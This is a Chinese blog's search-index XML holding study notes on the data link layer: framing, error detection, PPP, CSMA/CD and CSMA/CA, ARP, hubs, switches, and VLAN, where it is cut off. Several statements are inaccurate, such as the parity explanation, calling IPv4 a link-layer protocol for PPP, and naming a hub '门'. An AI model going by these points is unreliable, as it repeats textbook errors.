<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>敬请期待</title>
      <link href="/2024/03/07/%E6%95%AC%E8%AF%B7%E6%9C%9F%E5%BE%85/"/>
      <url>/2024/03/07/%E6%95%AC%E8%AF%B7%E6%9C%9F%E5%BE%85/</url>
      
        <content type="html"><![CDATA[<h1 id="暂停更新ing"><a href="#暂停更新ing" class="headerlink" title="暂停更新ing"></a>暂停更新ing</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络：数据链路层</title>
      <link href="/2024/03/04/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2024/03/04/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h3 id="计算机网络相关链接："><a href="#计算机网络相关链接：" class="headerlink" title="计算机网络相关链接："></a>计算机网络相关链接：</h3><p><a href="https://h1khuu.github.io/2024/02/09/%E7%89%A9%E7%90%86%E5%B1%82/">物理层 | hikhuu’s blog</a></p><p><a href="https://h1khuu.github.io/2024/02/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/">计算机网络概述 | hikhuu’s blog</a></p><h3 id="数据链路层的概念"><a href="#数据链路层的概念" class="headerlink" title="数据链路层的概念"></a>数据链路层的概念</h3><p>数据链路层是<strong>OSI模型</strong>，即<strong>开放式通信系统互联参考模型（Open System Interconnection Reference Model）</strong>中的<strong>第二层</strong>，它负责在物理层提供的基本连接上建立可靠的数据链路。该层的主要任务是将数据帧从一个物理节点传输到另一个物理节点，通过物理介质（例如电缆、光纤或无线信道）传送数据。</p><h3 id="使用点对点信道的数据链路层"><a href="#使用点对点信道的数据链路层" class="headerlink" title="使用点对点信道的数据链路层"></a>使用点对点信道的数据链路层</h3><p>使用点对点信道的数据链路层主要涉及两个设备之间的直接通信，而不涉及多个设备之间的共享通信。点对点信道通常是指两个设备之间建立的直接连接，这可以是通过物理介质（如串口线）或逻辑连接（如虚拟专用网络）实现的。</p><p>以下是使用点对点信道的数据链路层的主要特点：</p><ul><li><p><strong>直接连接：</strong> 数据链路层在点对点信道中负责建立直接连接，确保两个设备之间的通信。这种连接通常是点对点通信的一部分，其中一个设备是发送方，另一个是接收方。</p></li><li><p><strong>简单性：</strong> 由于只涉及两个设备之间的通信，点对点信道的数据链路层通常相对简单。协议的设计和实现可以专注于满足这种直接连接的特定需求，而不需要考虑多设备之间的复杂通信。</p></li><li><p><strong>全双工或半双工通信：</strong> 点对点信道的数据链路层可以支持全双工或半双工通信，取决于通信需求。全双工允许两个设备同时进行双向通信，而半双工则要求设备在同一时间内只能发送或接收。</p></li><li><p><strong>物理层适配：</strong> 数据链路层需要适应底层物理介质的特性，例如在串口通信中可能需要考虑电气信号的传输，或者在无线点对点连接中需要考虑频谱和信号强度等因素。</p></li><li><p><strong>差错检测和纠正：</strong> 数据链路层在点对点通信中仍然需要处理差错检测和纠正，以确保数据的可靠性。这可以包括使用校验和、CRC（循环冗余检测）等技术。</p></li><li><p><strong>协议选择：</strong> 在点对点信道上，可以选择适当的数据链路层协议，以满足特定的通信需求。常见的协议包括HDLC（High-Level Data Link Control）、PPP（Point-to-Point Protocol）等。</p></li></ul><p>总体而言，点对点信道的数据链路层通过建立直接的、专用的通信连接，为两个设备之间的通信提供了一种简单而直接的方式。这种通信模式在许多应用场景中都非常常见，例如串口通信、拨号连接、虚拟专用网络等。</p><h3 id="使用广播信道的数据链路层"><a href="#使用广播信道的数据链路层" class="headerlink" title="使用广播信道的数据链路层"></a>使用广播信道的数据链路层</h3><p>使用广播信道的数据链路层涉及多个设备共享同一通信介质，其中每个设备可以发送和接收数据。在广播信道中，数据链路层需要处理多个设备之间的竞争、冲突和协同操作，以确保数据的可靠传输。</p><p>以下是使用广播信道的数据链路层的主要特点：</p><ul><li><p><strong>共享介质：</strong> 在广播信道中，多个设备共享同一个通信介质，如以太网中的同一物理电缆。这就需要数据链路层协议来协调设备的访问，以防止冲突和碰撞。</p></li><li><p><strong>CSMA&#x2F;CD协议：</strong> 在以太网等广播信道中，常见的数据链路层协议是CSMA&#x2F;CD（Carrier Sense Multiple Access with Collision Detection）。该协议允许设备在发送数据之前先检测信道是否被占用，如果信道忙，则设备等待一段时间后重新尝试发送。如果发生碰撞（多个设备同时尝试发送数据），设备会检测到碰撞并采取后续处理，如随机退避后重新发送。</p></li><li><p><strong>CSMA&#x2F;CA协议：</strong>CSMA&#x2F;CA（Carrier Sense Multiple Access with Collision Avoidance）是一种用于无线网络的数据链路层协议，特别是在IEEE 802.11标准中广泛使用。与CSMA&#x2F;CD（Carrier Sense Multiple Access with Collision Detection）不同，CSMA&#x2F;CA专为避免碰撞而设计，因为在无线环境中，由于信号传播的特性，检测到碰撞是相对困难的。</p></li><li><p><strong>地址解析：</strong> 在广播信道中，数据链路层通常使用物理地址（MAC地址）来标识设备。地址解析协议（如ARP，Address Resolution Protocol）帮助设备将网络层地址（如IP地址）映射到物理地址，以便正确路由数据。</p></li><li><p><strong>广播和多播：</strong> 数据链路层支持广播和多播传输。广播是将数据发送到网络中的所有设备，而多播是将数据发送到一个特定的设备组。这有助于在局域网中有效地传递信息。</p></li><li><p><strong>流量控制：</strong> 数据链路层需要处理共享介质上的流量控制，以确保网络中的设备不会过多地发送数据，从而导致冲突和性能问题。</p></li><li><p><strong>帧定界和分割：</strong> 数据链路层需要在数据流中定义帧的定界和分割规则，以便接收设备能够正确地解析和处理帧。</p></li><li><p><strong>广播域：</strong> 在广播信道中，网络被划分为广播域，即在该域内的设备可以互相通信。这种划分有助于管理和隔离网络流量。</p></li></ul><p>总体而言，使用广播信道的数据链路层需要处理多设备之间的竞争和协同操作，以确保有效、可靠地共享通信介质。以太网是一个典型的使用广播信道的网络技术，广泛用于局域网中。</p><h3 id="数据链路层的互连设备"><a href="#数据链路层的互连设备" class="headerlink" title="数据链路层的互连设备"></a>数据链路层的互连设备</h3><p>数据链路层的互连设备包括网桥（Bridge）和交换机（Switch），它们在局域网中用于连接和管理网络中的不同部分。总的来说，网桥和交换机在数据链路层工作，通过学习和过滤机制提高了网络性能，而门是一个简单的物理层设备，仅负责信号的放大，不具备智能转发能力。</p><h4 id="网桥（Bridge）和交换机（Switch）的工作原理："><a href="#网桥（Bridge）和交换机（Switch）的工作原理：" class="headerlink" title="网桥（Bridge）和交换机（Switch）的工作原理："></a>网桥（Bridge）和交换机（Switch）的工作原理：</h4><ul><li><h5 id="网桥（Bridge）的工作原理："><a href="#网桥（Bridge）的工作原理：" class="headerlink" title="网桥（Bridge）的工作原理："></a><strong>网桥（Bridge）的工作原理：</strong></h5><ul><li><p><strong>过滤决策：</strong> 网桥在数据链路层工作，能够识别数据帧中的物理地址（MAC地址）。它根据源和目标地址过滤数据帧，决定是否将数据帧转发到目标网络。</p></li><li><p><strong>学习机制：</strong> 网桥通过学习源地址和端口的对应关系，建立一个地址表（MAC地址表）。它根据这个表来决定将数据帧转发到哪个端口，避免将数据广播到整个网络。</p></li><li><p><strong>转发决策：</strong> 当网桥接收到数据帧时，它会查找地址表来判断是否知道目标地址的位置。如果知道，就只将数据帧转发到目标网络；否则，就将数据帧广播到所有网络。</p></li></ul></li><li><h5 id="交换机（Switch）的工作原理："><a href="#交换机（Switch）的工作原理：" class="headerlink" title="交换机（Switch）的工作原理："></a><strong>交换机（Switch）的工作原理：</strong></h5><ul><li><p><strong>存储转发：</strong> 交换机通过存储转发方式工作。它接收到整个数据帧后，会存储整个帧，然后再根据目标地址进行转发决策。这种方式避免了碰撞和冲突，提高了网络性能。</p></li><li><p><strong>地址学习：</strong> 交换机通过学习源地址和端口的对应关系，建立地址表。这样，交换机能够快速地将数据帧定向到目标端口，而不必广播到整个网络。</p></li><li><p><strong>转发决策：</strong> 交换机根据地址表，将数据帧准确地转发到目标端口，而不需要广播。这提高了网络的效率和带宽利用率。</p></li></ul></li></ul><h4 id="门（Hub）与交换机的区别："><a href="#门（Hub）与交换机的区别：" class="headerlink" title="门（Hub）与交换机的区别："></a>门（Hub）与交换机的区别：</h4><ul><li><h5 id="门（Hub）的特点："><a href="#门（Hub）的特点：" class="headerlink" title="门（Hub）的特点："></a><strong>门（Hub）的特点：</strong></h5><ul><li><p><strong>物理层设备：</strong> 门是一个物理层设备，工作在 OSI 模型的第一层，仅仅是一个信号放大器，不理解或处理数据帧。</p></li><li><p><strong>广播：</strong> 当门接收到数据时，它会将数据帧广播到所有连接的设备，无论目标地址是什么。这会导致网络中的所有设备都要处理这个数据帧。</p></li><li><p><strong>共享冲突域：</strong> 由于门的工作方式，所有设备共享相同的冲突域，可能导致网络拥塞和性能下降。</p></li></ul></li><li><h5 id="交换机与门的区别："><a href="#交换机与门的区别：" class="headerlink" title="交换机与门的区别："></a><strong>交换机与门的区别：</strong></h5><ul><li><p><strong>数据链路层设备：</strong> 交换机是数据链路层设备，能够理解和处理数据帧，可以根据 MAC 地址进行智能的转发。</p></li><li><p><strong>有地址表：</strong> 交换机拥有一个地址表，能够学习和存储设备的 MAC 地址，并根据这个表决定将数据帧转发到哪个端口。</p></li><li><p><strong>减小冲突域：</strong> 由于交换机的智能转发和地址学习功能，它可以将不同端口划分为不同的冲突域，有效减小了网络的拥塞和碰撞概率。</p></li></ul></li></ul><h3 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h3><p><strong>封装成帧</strong>是数据链路层的一个重要过程，它将从上层协议接收到的数据单元添加帧头和帧尾，形成一个完整的数据帧。这个过程是为了在数据链路层中传输数据时，提供帧定界、地址标识、错误检测等控制信息。</p><h4 id="主要目的和作用："><a href="#主要目的和作用：" class="headerlink" title="主要目的和作用："></a>主要目的和作用：</h4><ul><li><p><strong>帧定界：</strong> 帧头和帧尾的添加使得接收端能够识别一个完整的数据帧。帧定界是非常重要的，因为它告诉接收端何时开始接收数据帧，何时结束接收数据帧。这样，接收端能够正确地解析和处理每个帧，确保数据的完整性。</p></li><li><p><strong>地址标识：</strong> 帧头中可能包含源地址和目标地址，这些地址用于在局域网中标识发送和接收设备。在以太网等网络中，使用MAC地址作为物理地址标识。</p></li><li><p><strong>控制信息：</strong> 帧头中可能包含一些控制字段，用于指示帧的类型、流控信息、差错检测和纠正等。这些信息有助于数据链路层的协议进行正确的数据处理。</p></li><li><p><strong>差错检测和纠正：</strong> 帧头和帧尾中可能包含用于差错检测和纠正的冗余信息，例如循环冗余检测码（CRC）。这有助于接收端检测是否在传输过程中发生了错误，并采取适当的措施进行纠正。</p></li></ul><h4 id="具体步骤："><a href="#具体步骤：" class="headerlink" title="具体步骤："></a>具体步骤：</h4><ul><li><p><strong>添加帧头：</strong> 在数据链路层接收到来自上层协议的数据时，会在数据前添加帧头，包含帧的起始标志、地址信息、控制信息等。</p></li><li><p><strong>添加帧尾：</strong> 在数据的末尾添加帧尾，通常包含帧的结束标志和差错检测码（如CRC），用于确保数据的完整性。</p></li><li><p><strong>传输：</strong> 带有帧头和帧尾的完整数据帧被传输到物理介质上，通过网络传递到目标设备。</p></li><li><p><strong>接收端处理：</strong> 接收端根据帧头和帧尾的信息来识别和提取数据帧，然后进行相应的处理，如差错检测、解析地址等。</p></li></ul><h3 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h3><p>透明传输是指数据链路层对上层交付的传输数据没有任何限制，使得上层协议不需要关心底层传输细节，就好像数据链路层不存在一样。这使得<strong>不同网络层之间的协议能够独立工作，而无需考虑底层传输</strong>的具体实现。</p><p><strong>在面向字节的物理链路上</strong>，透明传输通常使用字节填充（或字符填充）的方法。这意味着数据链路层会在需要的情况下插入特殊的字节（填充字符），以防止与控制字符混淆，并确保传输的数据帧被正确解释。</p><p><strong>在面向比特的物理链路上</strong>，透明传输则使用比特填充的方法。这涉及在数据中插入特殊的比特模式，以确保数据链路层能够正确解析数据帧。</p><p>为了提高帧的传输效率，数据链路层希望帧的数据部分的长度尽可能大。然而，考虑到不同的因素，如网络的<strong>最大传送单元（MTU）、差错控制的开销、帧的处理时间</strong>等，每一种数据链路层协议都规定了帧的数据部分的长度上限，即最大传送单元（MTU）。这个上限是为了确保在不同的网络条件下能够可靠地传输数据。</p><h3 id="差错检测"><a href="#差错检测" class="headerlink" title="差错检测"></a>差错检测</h3><p>差错检测是数据通信中的一项重要任务，用于检测在数据传输过程中是否发生了错误。这有助于确保数据的完整性和可靠性。常见的差错检测方法包括奇偶校验、循环冗余检测（CRC）、校验和等。</p><ul><li><h4 id="奇偶校验："><a href="#奇偶校验：" class="headerlink" title="奇偶校验："></a><strong>奇偶校验：</strong></h4><ul><li><p><strong>原理：</strong> 在奇偶校验中，发送端在传送数据之前计算数据中1的个数（或0的个数），然后在数据末尾添加一位（奇校验）或零位（偶校验），使得总的位数为奇数或偶数。</p></li><li><p><strong>检测方式：</strong> 接收端根据接收到的数据重新计算奇偶位，如果接收到的数据与计算出的奇偶位不匹配，就说明发生了错误。</p></li></ul></li><li><h4 id="循环冗余检测（CRC）："><a href="#循环冗余检测（CRC）：" class="headerlink" title="循环冗余检测（CRC）："></a><strong>循环冗余检测（CRC）：</strong></h4><ul><li><p><strong>原理：</strong> CRC使用多项式除法来生成冗余校验码，将这个校验码附加到数据中一起传输。</p></li><li><p><strong>检测方式：</strong> 接收端使用相同的多项式进行计算，如果计算出的冗余校验码与接收到的校验码不匹配，就说明发生了错误。</p></li></ul></li><li><h4 id="校验和（Checksum）："><a href="#校验和（Checksum）：" class="headerlink" title="校验和（Checksum）："></a><strong>校验和（Checksum）：</strong></h4><ul><li><p><strong>原理：</strong> 校验和是通过对数据中的每个字节进行加法运算生成的。发送端将加法结果作为校验和发送给接收端。</p></li><li><p><strong>检测方式：</strong> 接收端也对接收到的数据中的每个字节进行加法运算，然后与接收到的校验和进行比较，如果不匹配，则发生了错误。</p></li></ul></li><li><h4 id="海明码（Hamming-Code）："><a href="#海明码（Hamming-Code）：" class="headerlink" title="海明码（Hamming Code）："></a><strong>海明码（Hamming Code）：</strong></h4><ul><li><p><strong>原理：</strong> 海明码是一种通过在数据中添加冗余位来检测并纠正单比特错误的方法。它使用矩阵运算来生成和检测错误。</p></li><li><p><strong>检测方式：</strong> 接收端利用海明码的结构来检测并在可能的情况下纠正错误。</p></li></ul></li></ul><h3 id="可靠传输：等待-停止协议"><a href="#可靠传输：等待-停止协议" class="headerlink" title="可靠传输：等待-停止协议"></a>可靠传输：等待-停止协议</h3><p><strong>停止-等待协议（Stop-and-Wait Protocol，简称SW）</strong>是一种简单的可靠传输协议，常用于在数据链路层中实现。它确保了数据的可靠传输，但同时可能由于其效率较低而不适用于高延迟或高带宽的网络环境。</p><h4 id="停止-等待协议的基本原理："><a href="#停止-等待协议的基本原理：" class="headerlink" title="停止-等待协议的基本原理："></a>停止-等待协议的基本原理：</h4><ol><li><p><strong>帧的发送：</strong> 发送方在发送一帧后等待确认，确保接收方成功接收并确认了帧。</p></li><li><p><strong>等待确认：</strong> 发送方在发送完一帧后会进入等待确认状态，等待接收方的确认帧。</p></li><li><p><strong>确认帧：</strong> 接收方在成功接收到帧后，会发送确认帧给发送方。</p></li><li><p><strong>超时重传：</strong> 如果发送方在一定时间内没有收到确认帧，它会假设帧在传输过程中出现了问题，触发超时重传机制，重新发送该帧。</p></li></ol><h4 id="SW协议的特点："><a href="#SW协议的特点：" class="headerlink" title="SW协议的特点："></a>SW协议的特点：</h4><ol><li><p><strong>一次只能发送一个帧：</strong> 在停止-等待协议中，发送方在等待接收到确认帧之前，不会发送下一个帧。这使得传输速率相对较低，尤其在网络延迟较大的情况下。</p></li><li><p><strong>可靠性：</strong> SW协议通过等待确认的方式来确保数据的可靠传输，因为只有在接收方确认帧正确接收后，发送方才会发送下一个帧。</p></li><li><p><strong>超时机制：</strong> 如果发送方在一定时间内没有收到确认帧，就会认为发生了丢失或损坏，触发超时重传机制。</p></li><li><p><strong>序号和确认号：</strong> 通常，帧中包含序号，而确认帧中包含确认号。序号用于标识发送的帧，而确认号用于指示接收方期望收到的下一个帧。</p></li><li><p><strong>流水线效应：</strong> 停止-等待协议中的流水线效应较弱，因为每次只发送一个帧，等待确认之后才能发送下一个帧。</p></li></ol><h3 id="点对点协议PPP"><a href="#点对点协议PPP" class="headerlink" title="点对点协议PPP"></a>点对点协议PPP</h3><p><strong>PPP（Point-to-Point Protocol）</strong>是一种用于在点对点通信链路上进行数据链路层通信的协议。它通常用于在两个网络设备（例如，计算机和路由器）之间建立连接，提供可靠的数据传输和支持网络层协议（如IPv4或IPv6）的封装。</p><p>以下是PPP的主要特点和工作原理：</p><ul><li><p><strong>点对点通信：</strong> PPP主要设计用于点对点通信，即两个设备之间的直接连接。这可以是通过物理介质（例如串口线）或逻辑连接（例如虚拟专用网络）实现的。</p></li><li><p><strong>多种链路层协议支持：</strong> PPP支持多种链路层协议，其中包括IPv4、IPv6、IPX（Internetwork Packet Exchange）等。这意味着PPP可以适应不同的网络需求。</p></li><li><p><strong>封装和帧格式：</strong> PPP将上层协议的数据封装成帧，添加帧头和帧尾，形成一个完整的帧。帧的格式包括地址字段、控制字段、协议字段、数据字段和帧校验序列（FCS）。PPP的帧格式灵活，能够支持不同的链路层协议。</p></li><li><p><strong>LCP（Link Control Protocol）：</strong> PPP使用LCP协议来建立、配置和测试数据链路连接。LCP协议的主要功能包括对链路的状态检测、链路参数的配置协商以及链路的终止。</p></li><li><p><strong>NCP（Network Control Protocol）：</strong> PPP使用NCP协议来协商和配置网络层协议，例如IP协议。每个支持的网络层协议都有对应的NCP。</p></li><li><p><strong>可靠传输：</strong> PPP通过使用帧校验序列（FCS）来提供基本的差错检测，并通过LCP协议进行链路状态的管理。虽然PPP本身并未提供完整的可靠性机制，但在它之上的协议，如TCP，可以提供端到端的可靠传输。</p></li><li><p><strong>握手和认证：</strong> PPP支持握手和认证过程，通过PAP（Password Authentication Protocol）和CHAP（Challenge Handshake Authentication Protocol）等协议，实现对端设备的认证。</p></li></ul><h3 id="媒体接入控制"><a href="#媒体接入控制" class="headerlink" title="媒体接入控制"></a>媒体接入控制</h3><p><strong>媒体访问控制（Media Access Control，MAC）</strong>是数据链路层中的一个子层，负责规定和管理设备在共享通信介质上的访问方式。MAC层定义了设备如何检测和处理冲突、分配帧的优先级、以及进行地址识别等任务。其中，媒体访问控制的主要方法包括：</p><ul><li><p><strong>载波监听多路访问（Carrier Sense Multiple Access，CSMA）：</strong></p><ul><li><p><strong>CSMA&#x2F;CD：</strong> 在共享介质上，设备在发送数据之前监听信道，如果信道空闲，则开始发送数据；如果信道忙，则等待一段时间后重试。CSMA&#x2F;CD（Collision Detection）用于检测冲突并采取相应措施。</p></li><li><p><strong>CSMA&#x2F;CA：</strong> 在无线网络中，由于信号的传播特性，检测冲突相对困难。CSMA&#x2F;CA（Collision Avoidance）通过避免碰撞的方式进行操作。设备在发送数据之前发送一个RTS（Request to Send）帧，接收设备回复CTS（Clear to Send）帧，这样其他设备就知道当前信道是否被占用。</p></li></ul></li><li><p><strong>时分多路访问（Time Division Multiple Access，TDMA）：</strong></p><ul><li>TDMA将时间划分为若干个时隙，每个设备在分配的时隙中进行通信。这样，设备之间不会发生碰撞，每个设备在自己的时隙内独占通信介质。</li></ul></li><li><p><strong>频分多路访问（Frequency Division Multiple Access，FDMA）：</strong></p><ul><li>FDMA将频谱划分为若干个频带，每个设备在一个频带上进行通信。这样，不同设备在不同的频带上工作，避免了碰撞。</li></ul></li><li><p><strong>轮询访问：</strong></p><ul><li>设备按照预定的顺序轮流获得通信介质的使用权。轮询访问的方式适用于有限数量的设备，但可能引入延迟。</li></ul></li><li><p><strong>随机访问：</strong></p><ul><li>设备在发送数据前先进行随机等待，然后尝试发送。如果发生冲突，设备会采取退避算法，在一段时间后重新尝试发送。</li></ul></li><li><p><strong>集中控制：</strong></p><ul><li>在集中控制的环境中，一个中心控制设备负责协调其他设备的访问。这种方式通常用于局域网或广域网的管理。</li></ul></li></ul><p>不同的媒体访问控制方法适用于不同的网络环境和通信介质。选择适当的MAC协议取决于网络的特性、设备数量、通信需求以及实际应用场景。例如，以太网通常采用CSMA&#x2F;CD，而无线局域网则常使用CSMA&#x2F;CA。</p><h3 id="随机接入-CSMA-CA协议和ARP协议"><a href="#随机接入-CSMA-CA协议和ARP协议" class="headerlink" title="随机接入-CSMA&#x2F;CA协议和ARP协议"></a>随机接入-CSMA&#x2F;CA协议和ARP协议</h3><h4 id="CSMA-CA协议："><a href="#CSMA-CA协议：" class="headerlink" title="CSMA&#x2F;CA协议："></a>CSMA&#x2F;CA协议：</h4><p><strong>CSMA&#x2F;CA（Carrier Sense Multiple Access with Collision Avoidance）</strong>是一种用于无线网络中的媒体访问控制协议。在CSMA&#x2F;CA中，设备在发送数据之前先侦听信道，以避免碰撞，并采用一些机制来减少冲突的发生。这个协议常用于Wi-Fi等无线局域网技术中。</p><p>CSMA&#x2F;CA的工作原理如下：</p><ul><li><p><strong>侦听信道：</strong> 在发送数据之前，设备会先侦听信道，检测信道是否处于空闲状态。</p></li><li><p><strong>随机等待：</strong> 如果信道忙，设备会随机等待一段时间后再次尝试发送。这个随机等待有助于减少多个设备同时尝试发送数据的概率，降低碰撞的发生。</p></li><li><p><strong>RTS&#x2F;CTS机制：</strong> 为了避免隐藏节点问题，CSMA&#x2F;CA引入了RTS（Request to Send）和CTS（Clear to Send）机制。发送设备在发送数据之前会先发送一个RTS帧，接收设备回复CTS帧。其他设备会收到RTS和CTS帧，从而知道当前信道被占用。</p></li><li><p><strong>退避机制：</strong> 如果设备在发送数据后未收到ACK（确认帧），它会认为发生了碰撞或数据错误，执行退避机制，等待一段随机的时间后重新尝试发送。</p></li></ul><h4 id="ARP协议："><a href="#ARP协议：" class="headerlink" title="ARP协议："></a>ARP协议：</h4><p><strong>ARP（Address Resolution Protocol）</strong>则是一种解析网络层地址（通常是IP地址）到物理层地址（通常是MAC地址）的协议。它帮助设备确定目标设备的物理地址，以便正确地封装和发送数据帧。</p><p>ARP用于将网络层地址（通常是IPv4地址）解析为物理层地址（通常是MAC地址）。其工作过程如下：</p><ul><li><p><strong>请求：</strong> 当设备知道目标设备的IP地址但不知道其MAC地址时，会发送一个ARP请求广播，请求目标设备回复其MAC地址。</p></li><li><p><strong>回复：</strong> 目标设备收到ARP请求后，会发送一个ARP回复，包含自己的MAC地址。其他设备在收到回复后将目标设备的IP地址和MAC地址映射存储在ARP缓存中，以便将来使用。</p></li></ul><p>CSMA&#x2F;CA和ARP通常共同工作在网络协议栈中。CSMA&#x2F;CA用于控制无线信道上的媒体访问，而ARP用于解析网络层地址。在无线局域网中，CSMA&#x2F;CA是一种重要的媒体访问控制方式，而ARP则是在IP网络中解决地址解析问题的协议。</p><h3 id="MAC地址和IP地址"><a href="#MAC地址和IP地址" class="headerlink" title="MAC地址和IP地址"></a>MAC地址和IP地址</h3><p><strong>MAC地址（Media Access Control Address）</strong>和<strong>IP地址（Internet Protocol Address）</strong>是网络中两个不同的地址类型，各自用于不同的目的。</p><h4 id="MAC地址："><a href="#MAC地址：" class="headerlink" title="MAC地址："></a>MAC地址：</h4><ul><li><p><strong>定义：</strong> MAC地址是一个用于识别网络设备的物理地址，通常由48位二进制数字组成。在常见的以太网中，MAC地址也以六组十六进制数表示，每两个十六进制数之间用冒号或连字符分隔。</p></li><li><p><strong>唯一性：</strong> MAC地址在全球范围内是唯一的，每个网络设备都有独特的MAC地址。这确保了在网络中不会有两个设备具有相同的MAC地址。</p></li><li><p><strong>作用：</strong> MAC地址主要用于在数据链路层识别和定位设备，特别是在局域网中。在以太网中，帧中的目标MAC地址用于将数据帧传送到正确的接收设备。</p></li></ul><h4 id="IP地址："><a href="#IP地址：" class="headerlink" title="IP地址："></a>IP地址：</h4><ul><li><p><strong>定义：</strong> IP地址是用于在Internet上唯一标识和定位设备的逻辑地址。IPv4地址由32位二进制数字组成，通常以四组十进制数表示，每组数之间用点号分隔。IPv6则由128位组成，以八组十六进制数表示。</p></li><li><p><strong>层次结构：</strong> IP地址是网络层的一部分，用于实现全球互联网络。IP地址分为公共地址和私有地址，以及不同的地址类别（A、B、C等）。</p></li><li><p><strong>路由：</strong> IP地址的主要作用是在网络中进行路由和寻址。它允许数据包通过网络传递，并确保它们能够被正确地路由到目标设备。</p></li><li><p><strong>唯一性：</strong> 在IPv4中，IP地址在全球范围内也应该是唯一的，但由于IPv4地址空间的有限性，IPv6被引入以提供更广泛的唯一地址。</p></li></ul><p>在网络通信中，MAC地址和IP地址之间存在一定的映射关系。ARP协议（Address Resolution Protocol）用于将IP地址解析为对应的MAC地址。设备通过ARP协议查询目标设备的MAC地址，以便将数据帧正确发送到目标设备。</p><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>集线器（Hub）是一种网络设备，用于在局域网中连接多个设备，并共享通信介质。它工作在物理层，主要作为信号的中继器，将来自一个端口的信号广播到其他所有端口。与交换机不同，集线器并不具备学习和存储MAC地址的功能，也没有逐帧转发的能力。</p><p>以下是关于集线器的主要特点和工作原理：</p><h4 id="主要特点："><a href="#主要特点：" class="headerlink" title="主要特点："></a>主要特点：</h4><ul><li><p><strong>广播：</strong> 集线器接收到的数据会被广播到所有连接的设备，而不管数据的目标设备是谁。这导致所有设备都会接收到广播的数据帧。</p></li><li><p><strong>无存储和学习：</strong> 集线器不存储设备的MAC地址，也不学习设备的地址。因此，它对网络中设备的逻辑结构一无所知，所有数据都广播到所有端口。</p></li><li><p><strong>冲突域：</strong> 所有设备连接到集线器的同一个冲突域内。这意味着在同一时刻，只能有一个设备发送数据，以避免碰撞。</p></li><li><p><strong>半双工通信：</strong> 集线器使用半双工通信，同一时间只能进行发送或接收操作。设备不能同时发送和接收数据。</p></li></ul><h4 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h4><ul><li><p><strong>信号中继：</strong> 集线器的主要功能是将来自一个端口的信号中继到所有其他端口。当集线器接收到一个数据帧时，它会将该帧广播到所有连接的设备。</p></li><li><p><strong>物理层连接：</strong> 集线器连接设备的物理层是共享的，所有设备共用同一通信介质。这导致所有设备在同一时刻共享带宽，并可能引发冲突。</p></li><li><p><strong>冲突处理：</strong> 如果多个设备同时尝试发送数据，可能会发生冲突。在以太网中，冲突通过使用CSMA&#x2F;CD（Carrier Sense Multiple Access with Collision Detection）协议来检测和处理。</p></li><li><p><strong>广播：</strong> 集线器广播数据帧到所有端口，使得连接到集线器的每个设备都能接收到相同的数据。</p></li><li><p><strong>无区分设备：</strong> 集线器对连接的设备没有逻辑上的区分，无法识别设备的MAC地址或IP地址。</p></li></ul><h3 id="以太网交换机"><a href="#以太网交换机" class="headerlink" title="以太网交换机"></a>以太网交换机</h3><p>以太网交换机是一种网络设备，用于在局域网中连接多个设备，并在数据链路层上进行数据帧的转发。相比于集线器（Hub），交换机具有更高的性能和智能性，可以提高网络的效率和安全性。以下是关于以太网交换机的主要特点和工作原理：</p><h4 id="主要特点：-1"><a href="#主要特点：-1" class="headerlink" title="主要特点："></a>主要特点：</h4><ul><li><p><strong>逐帧转发：</strong> 以太网交换机通过学习每个设备的MAC地址，能够逐帧地将数据帧定向传输到目标设备，而不是广播到所有设备。这减少了冲突域，提高了带宽利用率。</p></li><li><p><strong>MAC地址表：</strong> 交换机维护一个MAC地址表，记录了每个设备的MAC地址与其连接的端口信息。通过这个表，交换机可以快速地确定数据帧的目标设备，并将数据帧仅传输到目标设备所在的端口。</p></li><li><p><strong>多端口：</strong> 以太网交换机通常具有多个端口，可以同时连接多台设备。端口的数量可以根据网络需求进行扩展。</p></li><li><p><strong>独立冲突域：</strong> 每个端口形成一个独立的冲突域，避免了多设备同时发送数据时的冲突，提高了网络性能。</p></li><li><p><strong>自适应速率：</strong> 现代以太网交换机通常支持自适应速率，能够自动调整端口的速率，以适应连接设备的速率差异。</p></li><li><p><strong>虚拟局域网（VLAN）支持：</strong> 交换机可以根据需要配置虚拟局域网，将不同的设备划分到不同的虚拟网络中，增加网络的灵活性和安全性。</p></li><li><p><strong>流量控制：</strong> 一些交换机支持流量控制机制，可以帮助管理网络流量，防止过载和丢包。</p></li></ul><h4 id="工作原理：-1"><a href="#工作原理：-1" class="headerlink" title="工作原理："></a>工作原理：</h4><ul><li><p><strong>学习MAC地址：</strong> 当交换机接收到数据帧时，它会检查源MAC地址，并将该地址与接收到的端口信息存储到MAC地址表中。如果MAC地址已存在，交换机更新对应端口的信息。</p></li><li><p><strong>查找MAC地址表：</strong> 当接收到数据帧时，交换机会查询MAC地址表，找到目标MAC地址对应的端口。如果找到，数据帧将仅被传输到目标端口。</p></li><li><p><strong>广播和未知目标：</strong> 如果目标MAC地址不在MAC地址表中，交换机会将数据帧广播到所有端口（除了源端口），以确保目标设备能够学习到源设备的MAC地址。</p></li><li><p><strong>逐帧转发：</strong> 交换机对每个数据帧都进行逐帧转发，将其定向传输到目标设备的端口，而不是广播到整个网络。</p></li><li><p><strong>流量控制：</strong> 一些交换机支持流量控制，可根据网络流量和性能进行调整，防止拥塞和数据丢失。</p></li></ul><h3 id="虚拟局域网：VLAN"><a href="#虚拟局域网：VLAN" class="headerlink" title="虚拟局域网：VLAN"></a>虚拟局域网：VLAN</h3><p><strong>虚拟局域网（Virtual Local Area Network，VLAN）</strong>是一种将单一物理局域网划分为多个逻辑上独立的子网络的技术。VLAN能够提高网络的灵活性、安全性和性能。以下是关于VLAN的主要特点和工作原理：</p><h4 id="主要特点：-2"><a href="#主要特点：-2" class="headerlink" title="主要特点："></a>主要特点：</h4><ol><li><p><strong>逻辑划分：</strong> 